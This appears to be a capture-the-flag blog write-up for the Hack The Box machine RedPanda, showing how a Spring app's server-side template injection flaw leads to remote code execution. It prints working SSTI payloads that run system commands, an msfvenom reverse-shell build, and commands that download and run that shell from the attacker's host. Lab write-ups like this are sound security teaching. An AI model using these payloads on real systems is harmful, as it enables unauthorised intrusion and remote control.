---
title: HTB - RedPanda | SSTI case study
date: 2022-09-05
draft: true
description: RedPanda Hack The Box Writeup/Walkthrough
tags: ["HTB", "ctf", "writeup", "SSTI", "Java"]
categories: ["Hack the Box"]
summary: RedPanda is an easy rated Linux machine that has an interesting path to user involving a Server Side Template Injection (SSTI) vulnerability.
---

RedPanda is an easy rated Linux machine that has an interesting path to user involving a Server Side Template Injection (SSTI) vulnerability.
It took me a while to figure out how to exploit the vulnerability, so I'm sharing here the steps I followed in order to obtain a low privileged reverse shell. 

The privilege escalation vector will not be part of this article as I found it to be a little contrived for my taste.


{{< badge >}}
New article!
{{< /badge >}}

![HTB_logo](/img/htb/redpanda/logo.png)

   Name | OpenSource
--------|------
    OS  | Linux
  Difficulty | Easy [20 points]


# Recon
Nmap shows the following open ports:
````
PORT     STATE SERVICE    VERSION
22/tcp   open  ssh        OpenSSH 8.2p1 Ubuntu 4ubuntu0.5 (Ubuntu Linux; 
8080/tcp open  http-proxy
````

Visiting port 8080 we are presented with a web application providing a simple search functionality.

![HTB_redpanda_homepage](/img/htb/redpanda/homepage.png)

A quick "test" search shows that the input text gets reflected in the web page.

![HTB_redpanda_testsearch](/img/htb/redpanda/test_search.png)

While a search without text seems to trigger a default search for the input "Greg", giving us a hint about a probable injection vulnerability.

![HTB_redpanda_search](/img/htb/redpanda/empty_search.png)

SQL Injection was my fisrt choice but after several failed attempts I went lucky with **SSTI** (Server Side Template Injection).

### SSTI (Server Side Template Injection)
First of all, what is a template engine?

> A template engine enables you to use static template files in your application. At runtime, the template engine replaces variables in a template file with actual values, and transforms the template into an HTML file sent to the client. This approach makes it easier to design an HTML page.

> When you build a server-side application with a template engine, the template engine replaces the variables in a template file with actual values, and displays this value to the client. This makes it easier to quickly build our application.


A Template Injection vulnerability occurs when user input is embedded in a template in an unsafe manner and a malicious user is able to directly attack web server internals or obtain RCE. 

A very good resource on the topic is provided [here](https://portswigger.net/research/server-side-template-injection) by Port Swigger.

As the artcile suggests, first of all we have to identify the underlying technology. In our case, visiting the homepage source code, it is possible to discover that the application is built with **Spring**.

![HTB_redpanda_spring](/img/htb/redpanda/spring_boot.png)


Searching on google for "Spring Boot SSTI", there is (among many others) [this](https://www.acunetix.com/blog/web-security-zone/exploiting-ssti-in-thymeleaf/) article explaining how to exploit the same vulnerabilty on *Thymeleaf*, another Java template engine.

Let's try with a simple SSTI payload and check how the web application responds.

We start with: `${{20*2}}`

![HTB_redpanda_blockedchar](/img/htb/redpanda/blocked_char.png)

The `$` character seems to be filtered. 

Trying with: `#{{20*2}}`, we do have a different response but the input is not being processed as we expect. 

![HTB_redpanda_ssti_#](/img/htb/redpanda/ssti_payload_1.png)

With`*{{20*2}}` we do have the response we are expecting.

![HTB_redpanda_ssti_*](/img/htb/redpanda/ssti_payload_2.png)

Now that we have identified the way to abuse the vulnerabiltity we have to understand how to obtain an RCE.

[PayloadAllTheThings](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Server%20Side%20Template%20Injection) has a nice list of SSTI vectors based on the webserver technology. 

In the Java section there is the following payload that can be useful to read `/etc/passwd`.

````
${T(java.lang.Runtime).getRuntime().exec('cat /etc/passwd')}
````
We know that in our case the `$` character is blocked, so we need to replace that with `*`. Also we want to change the command to execute and try to ping our attacking machine:

````
*{T(java.lang.Runtime).getRuntime().exec('ping 10.10.16.44')}
````
Running `tcpdump` on our machine we can see the traffic coming from the target.

````
> sudo tcpdump -i tun0

tcpdump: verbose output suppressed, use -v[v]... for full protocol decode
listening on tun0, link-type RAW (Raw IP), snapshot length 262144 bytes
21:02:40.109836 IP 10.10.16.44.44470 > 10.10.11.170.http-alt: Flags [S], seq 3013405788, win 64240, options [mss 1460,sackOK,TS val 415009260 ecr 0,nop,wscale 7], length 0
21:02:40.154621 IP 10.10.11.170.http-alt > 10.10.16.44.44470: Flags [S.], seq 1530025971, ack 3013405789, win 65160, options [mss 1335,sackOK,TS val 485292072 ecr 415009260,nop,wscale 7], length 0
21:02:40.154667 IP 10.10.16.44.44470 > 10.10.11.170.http-alt: Flags [.], ack 1, win 502, options [nop,nop,TS val 415009305 ecr 485292072], length 0
21:02:40.155400 IP 10.10.16.44.44470 > 10.10.11.170.http-alt: Flags [P.], seq 1:575, ack 1, win 502, options [nop,nop,TS val 415009306 ecr 485292072], length 574: HTTP: POST /search HTTP/1.1
21:02:40.242601 IP 10.10.11.170.http-alt > 10.10.16.44.44470: Flags [.], ack 575, win 505, options [nop,nop,TS val 485292161 ecr 415009306], length 0
21:02:40.326177 IP 10.10.11.170.http-alt > 10.10.16.44.44470: Flags [P.], seq 1:947, ack 575, win 505, options [nop,nop,TS val 485292203 ecr 415009306], length 946: HTTP: HTTP/1.1 200 
21:02:40.326201 IP 10.10.16.44.44470 > 10.10.11.170.http-alt: Flags [.], ack 947, win 501, options [nop,nop,TS val 415009477 ecr 485292203], length 0
21:02:40.326254 IP 10.10.11.170.http-alt > 10.10.16.44.44470: Flags [P.], seq 947:952, ack 575, win 505, options [nop,nop,TS val 485292203 ecr 415009306], length 5: HTTP
21:02:40.326258 IP 10.10.16.44.44470 > 10.10.11.170.http-alt: Flags [.], ack 952, win 501, options [nop,nop,TS val 415009477 ecr 485292203], length 0
21:02:40.326263 IP 10.10.11.170.http-alt > 10.10.16.44.44470: Flags [F.], seq 952, ack 575, win 505, options [nop,nop,TS val 485292203 ecr 415009306], length 0
21:02:40.326270 IP 10.10.11.170 > 10.10.16.44: ICMP echo request, id 2, seq 1, length 64
21:02:40.326333 IP 10.10.16.44 > 10.10.11.170: ICMP echo reply, id 2, seq 1, length 64
21:02:40.329018 IP 10.10.16.44.44470 > 10.10.11.170.http-alt: Flags [F.], seq 575, ack 953, win 501, options [nop,nop,TS val 415009480 ecr 485292203], length 0
21:02:40.456829 IP 10.10.11.170.http-alt > 10.10.16.44.44470: Flags [.], ack 576, win 505, options [nop,nop,TS val 485292375 ecr 415009480], length 0
21:02:41.288405 IP 10.10.11.170 > 10.10.16.44: ICMP echo request, id 2, seq 2, length 64
21:02:41.288432 IP 10.10.16.44 > 10.10.11.170: ICMP echo reply, id 2, seq 2, length 64
21:02:42.289360 IP 10.10.11.170 > 10.10.16.44: ICMP echo request, id 2, seq 3, length 64
21:02:42.289373 IP 10.10.16.44 > 10.10.11.170: ICMP echo reply, id 2, seq 3, length 64
21:02:43.290553 IP 10.10.11.170 > 10.10.16.44: ICMP echo request, id 2, seq 4, length 64
21:02:43.290566 IP 10.10.16.44 > 10.10.11.170: ICMP echo reply, id 2, seq 4, length 64
21:02:44.293154 IP 10.10.11.170 > 10.10.16.44: ICMP echo request, id 2, seq 5, length 64
21:02:44.293182 IP 10.10.16.44 > 10.10.11.170: ICMP echo reply, id 2, seq 5, length 64
````
This confirms that we have RCE!

At this point this will be the plan:
  1. create a msfvenom payload for the target machine
  2. upload the payload on the target
  3. start a listener on our machine
  4. start the reverse shell
  
To create the msfvenom payload:

````
msfvenom -p linux/x64/shell_reverse_tcp LHOST=10.10.16.44 LPORT=4444 -f elf > rev.elf
````
This will create a reverse shell on our machine named `rev.elf`.

To pass it over to the target machine we first start a Python server on our machine in the same directory where the payload resides. Then, to download it on target via SSTI, we launch:

````
*{T(java.lang.Runtime).getRuntime().exec('curl http://10.10.16.44:8888/rev.elf -o rev.elf')}
````

Our Python server will log a successful request:
````
Serving HTTP on 0.0.0.0 port 8888 (http://0.0.0.0:8888/) ...
10.10.11.170 - - [05/Sep/2022 21:17:16] "GET /rev.elf HTTP/1.1" 200 -
````


We change the payload permissions:
````
*{T(java.lang.Runtime).getRuntime().exec('chmod 777 ./rev.elf')}
````

And finally we launch it, after having set up a `nc` listener on our machine:
````
*{T(java.lang.Runtime).getRuntime().exec('./rev.elf')}
````

And here is our user shell!

````
connect to [10.10.16.44] from (UNKNOWN) [10.10.11.170] 49434
id
uid=1000(woodenk) gid=1001(logs) groups=1001(logs),1000(woodenk)
whoami
woodenk
````

The shell can be stabilized as always:
````
python3 -c 'import pty;pty.spawn("/bin/bash")
export TERM=xterm
CTRL+z to background the current shell
stty raw -echo; fg
````
